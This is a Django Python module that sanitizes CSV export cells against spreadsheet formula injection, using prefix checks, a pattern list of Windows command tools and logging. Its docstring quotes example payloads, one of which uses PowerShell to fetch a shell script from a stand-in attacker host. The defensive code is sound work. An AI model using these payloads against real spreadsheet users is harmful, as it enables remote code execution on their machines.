"""
CSV Formula Injection Protection

Prevents CSV/Excel formula injection attacks (CVE-2014-3524, CVE-2017-0199).

Attack vectors include cells starting with:
- = (formula)
- + (formula)
- - (formula)
- @ (formula)
- \t (tab - can be used to hide formulas)
- \r (carriage return)

Example malicious payloads:
- =cmd|'/c calc'!A1
- =1+1+cmd|'/c powershell IEX(wget attacker.com/shell.txt)'!A1
- @SUM(1+1)*cmd|'/c calc'!A1

This module provides defense-in-depth protection by:
1. Detecting dangerous formula patterns
2. Sanitizing values with quote prefix
3. Logging sanitization attempts
4. Providing configurable protection levels

Complies with:
- OWASP ASVS v4.0 Section 5.2.3
- Rule #9 from .claude/rules.md (Input Validation)
- Rule #10 from .claude/rules.md (Security Features)
"""

import logging
import re
from typing import Any, List, Dict, Union, Optional
from django.conf import settings

logger = logging.getLogger('security.csv_injection')


class CSVInjectionProtector:
    """
    Comprehensive CSV formula injection protection.

    Uses multiple defense layers:
    1. Prefix detection (=, +, -, @, |, %)
    2. Formula pattern detection (cmd, powershell, etc.)
    3. Control character detection
    4. Quote escaping for dangerous cells
    """

    # Dangerous prefixes that trigger formula execution
    DANGEROUS_PREFIXES = ('=', '+', '-', '@', '\t', '\r', '|', '%')

    # Dangerous formula patterns (case-insensitive)
    DANGEROUS_PATTERNS = [
        r'cmd',
        r'powershell',
        r'mshta',
        r'rundll32',
        r'regsvr32',
        r'wscript',
        r'cscript',
        r'bitsadmin',
        r'certutil',
        r'IEX\(',  # PowerShell Invoke-Expression
        r'DDE\(',  # Dynamic Data Exchange
        r'HYPERLINK\(',
        r'IMPORTXML\(',
        r'WEBSERVICE\(',
    ]

    # Compile patterns for performance
    PATTERN_REGEX = re.compile(
        '|'.join(DANGEROUS_PATTERNS),
        re.IGNORECASE
    )

    def __init__(self, strict_mode: bool = None):
        """
        Initialize CSV injection protector.

        Args:
            strict_mode: Enable strict mode (sanitize all potentially dangerous cells)
                        If None, uses settings.CSV_INJECTION_STRICT_MODE (default: True)
        """
        if strict_mode is None:
            strict_mode = getattr(settings, 'CSV_INJECTION_STRICT_MODE', True)

        self.strict_mode = strict_mode
        self.sanitized_count = 0
        self.total_cells_processed = 0

    def sanitize_value(self, value: Any, log_sanitization: bool = True) -> str:
        """
        Sanitize a single cell value against CSV injection attacks.

        Args:
            value: Cell value to sanitize
            log_sanitization: Whether to log sanitization attempts

        Returns:
            Sanitized string value safe for CSV export

        Examples:
            >>> protector = CSVInjectionProtector()
            >>> protector.sanitize_value("=1+1")
            "'=1+1"
            >>> protector.sanitize_value("@SUM(A1:A10)")
            "'@SUM(A1:A10)"
            >>> protector.sanitize_value("normal text")
            "normal text"
        """
        self.total_cells_processed += 1

        # Convert to string
        if value is None:
            return ''

        str_value = str(value)

        # Empty strings are safe
        if not str_value:
            return ''

        # Check for dangerous prefixes
        if str_value[0] in self.DANGEROUS_PREFIXES:
            if log_sanitization:
                logger.warning(
                    "CSV injection attempt detected - dangerous prefix",
                    extra={
                        'original_value': str_value[:100],  # Limit log size
                        'prefix': str_value[0],
                        'value_length': len(str_value)
                    }
                )

            self.sanitized_count += 1
            # Prefix with single quote to escape formula
            return f"'{str_value}"

        # Check for dangerous formula patterns (strict mode)
        if self.strict_mode and self.PATTERN_REGEX.search(str_value):
            if log_sanitization:
                logger.warning(
                    "CSV injection attempt detected - dangerous pattern",
                    extra={
                        'original_value': str_value[:100],
                        'value_length': len(str_value)
                    }
                )

            self.sanitized_count += 1
            # Prefix with single quote
            return f"'{str_value}"

        # Check for control characters (tab, carriage return)
        if '\t' in str_value or '\r' in str_value:
            # Replace control characters with spaces
            sanitized = str_value.replace('\t', ' ').replace('\r', ' ')

            if log_sanitization:
                logger.info(
                    "CSV control characters removed",
                    extra={
                        'original_value': str_value[:100],
                        'sanitized_value': sanitized[:100]
                    }
                )

            self.sanitized_count += 1
            return sanitized

        # Value is safe
        return str_value

    def sanitize_row(self, row: List[Any]) -> List[str]:
        """
        Sanitize all cells in a row.

        Args:
            row: List of cell values

        Returns:
            List of sanitized string values
        """
        return [self.sanitize_value(cell) for cell in row]

    def sanitize_dict(self, row_dict: Dict[str, Any]) -> Dict[str, str]:
        """
        Sanitize all values in a dictionary row.

        Args:
            row_dict: Dictionary with column names as keys

        Returns:
            Dictionary with sanitized string values
        """
        return {
            key: self.sanitize_value(value)
            for key, value in row_dict.items()
        }

    def sanitize_data(
        self,
        data: Union[List[List[Any]], List[Dict[str, Any]]]
    ) -> Union[List[List[str]], List[Dict[str, str]]]:
        """
        Sanitize entire dataset (list of rows or list of dicts).

        Args:
            data: Dataset to sanitize (list of lists or list of dicts)

        Returns:
            Sanitized dataset with same structure

        Raises:
            TypeError: If data is not in expected format
        """
        if not data:
            return data

        # Detect format
        first_row = data[0]

        if isinstance(first_row, dict):
            # List of dictionaries
            sanitized = [self.sanitize_dict(row) for row in data]
        elif isinstance(first_row, (list, tuple)):
            # List of lists/tuples
            sanitized = [self.sanitize_row(list(row)) for row in data]
        else:
            raise TypeError(
                f"Unsupported data format: {type(first_row)}. "
                "Expected list of dicts or list of lists."
            )

        # Log summary
        logger.info(
            "CSV data sanitization complete",
            extra={
                'total_cells': self.total_cells_processed,
                'sanitized_cells': self.sanitized_count,
                'sanitization_rate': (
                    self.sanitized_count / self.total_cells_processed * 100
                    if self.total_cells_processed > 0 else 0
                )
            }
        )

        return sanitized

    def get_sanitization_report(self) -> Dict[str, Any]:
        """
        Get detailed sanitization report.

        Returns:
            Dictionary with sanitization statistics
        """
        return {
            'total_cells_processed': self.total_cells_processed,
            'cells_sanitized': self.sanitized_count,
            'sanitization_rate': (
                self.sanitized_count / self.total_cells_processed * 100
                if self.total_cells_processed > 0 else 0
            ),
            'strict_mode': self.strict_mode
        }


# Singleton instance for convenience
_default_protector = None


def get_csv_protector(strict_mode: bool = None) -> CSVInjectionProtector:
    """
    Get CSV injection protector instance.

    Args:
        strict_mode: Enable strict mode (default from settings)

    Returns:
        CSVInjectionProtector instance
    """
    global _default_protector

    if _default_protector is None or strict_mode is not None:
        _default_protector = CSVInjectionProtector(strict_mode=strict_mode)

    return _default_protector


# Convenience functions
def sanitize_csv_value(value: Any) -> str:
    """Sanitize a single CSV cell value."""
    protector = get_csv_protector()
    return protector.sanitize_value(value)


def sanitize_csv_data(
    data: Union[List[List[Any]], List[Dict[str, Any]]]
) -> Union[List[List[str]], List[Dict[str, str]]]:
    """Sanitize entire CSV dataset."""
    protector = get_csv_protector()
    return protector.sanitize_data(data)
